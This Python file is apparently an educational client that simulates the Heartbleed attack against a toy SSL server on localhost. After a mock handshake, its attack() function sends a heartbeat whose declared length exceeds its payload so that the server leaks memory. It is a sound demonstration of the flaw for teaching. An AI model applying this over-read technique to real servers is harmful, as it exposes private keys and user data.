import socket
from SSLPacket import SSLPacket, H_BEAT, H_SHAKE, C_HELLO, S_HELLO, CERT, S_KEY_EX, CERT_REQ, S_HELLO_FIN, CERT_VERIFY, C_KEY_EX, FIN, END
import time
import random



HOST = '127.0.0.1'  # The server's hostname or IP address
PORT = 65432        # The port used by the server
BUFSIZE = 1024  # Buffer size


ClientCertificate = ["90379354261689780614203361405066170842644723517796574222141854180560344772929272012047686310740292793858442680786609301853884797311016993037398154923585814309315960075335524608558911708042439955987587920532929476982763655302759320622825896839586342939599330666828311177100229979175366428849697156471500053891", "134826985114428444222462262938720519942370306697674624544196516605831833735004883494376346424588162261458949450778671388432645230306358735895459878500095280375007785405742699239392672308148029141138996288755657310543102011633317786177948435028192747032104760717067043386242538499142434213337297046792902557149"]


# send hello packet to server
def sendHelloPacket(conn):
    hello_packet = SSLPacket(type=H_SHAKE, payload_type=C_HELLO)
    print("Sending Hello Packet to Server...")
    conn.send(hello_packet.encode())
    print("Hello Packet Sent")


# recieve hello packet from server
def recieveHelloPacket(conn):
    s = conn.recv(BUFSIZE)
    packet = SSLPacket().decode(s)
    if packet.payload_type == S_HELLO:
        print("Recieved Hello Packet from Server")


# recieve certificate from server
def recieveCertificate(conn):
    s = conn.recv(BUFSIZE)
    packet = SSLPacket().decode(s)
    if packet.payload_type == S_KEY_EX:
        print("Server certificate recieved")


# recieve Hello Done packet from server
def recieveServerHelloDone(conn):
    s = conn.recv(BUFSIZE)
    packet = SSLPacket().decode(s)
    if packet.payload_type == S_HELLO_FIN:
        print("Recieved Server hello done")


# send client certificate
def sendCertificate(conn):
    packet = SSLPacket(type=H_SHAKE, payload_type=C_KEY_EX, payload=ClientCertificate)
    conn.send(packet.encode())


# send FIN packet to server indicating handshake complete
def sendFin(conn):
    packet = SSLPacket(type=H_SHAKE, payload_type=FIN)
    conn.send(packet.encode())


# recieve FIN packet to server indicating handshake complete
def recieveFin(conn):
    s = conn.recv(BUFSIZE)
    packet = SSLPacket().decode(s)
    if packet.payload_type == FIN:
        print("Server Handshake Fin")


# start handshake with client
def handshake(conn):
    print("-" * 40)
    print("HandShake")
    print("-" * 40)

    print("HandShake initiated....")
    time.sleep(2)
    sendHelloPacket(conn)
    recieveHelloPacket(conn)
    recieveCertificate(conn)
    recieveServerHelloDone(conn)

    time.sleep(1)
    sendCertificate(conn)
    sendFin(conn)
    recieveFin(conn)
    print("HandShake done")
    time.sleep(2)



# send heart beat to server. Server will reply with same heartbeat in normal case
def sendHeartBeat(conn, data, length):
    packet = SSLPacket(type=H_BEAT, length=length, payload_type=H_BEAT, payload=data)
    conn.send(packet.encode())


# recieve heart beat from server
def recieveHeartBeatResponse(conn):
    s = conn.recv(BUFSIZE)
    packet = SSLPacket().decode(s)
    if packet.type == H_BEAT:
        data = packet.payload
        return data


# end connection to server 
def endConnection(conn):
    packet = SSLPacket(type=END)
    conn.send(packet.encode())


# exploit Heart Bleed Vulnerability of SSL
def attack(conn):
    print("\n\n")
    print("-" * 40)
    print("Testing Normal Heart beat...")
    print("-" * 40)
    hb_data = "bird"
    length = 4
    time.sleep(1)

    print(f"HeartBeat: data={hb_data}, length={length}")
    print("Sending Heart Beat....")
    sendHeartBeat(conn, hb_data, length)
    response = recieveHeartBeatResponse(conn)
    print("\nServer response to HeartBeat:")
    print("."*40)
    print(response)
    print("."*40)
    print("\n\n")
    time.sleep(1)



    print("-" * 40)
    print("Exploiting Heart Bleed Vulnerability")
    print("-" * 40)
    time.sleep(1)
    
    hb_data = "bird"
    length = random.randint(100, 200)
    print(f"HeartBeat: data={hb_data}, length={length}")
    print("Sending Heart Beat....")
    sendHeartBeat(conn, hb_data, length)
    response = recieveHeartBeatResponse(conn)
    print("\nServer response to HeartBeat")
    print("."*40)
    print(response)
    print("."*40)




# start client
def startClient():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        try:
            print('Connecting...')
            time.sleep(2)
            print("Connected")
            handshake(s)
            attack(s)
            endConnection(s)
        except:
            endConnection(s)



if __name__ == "__main__":
    startClient()
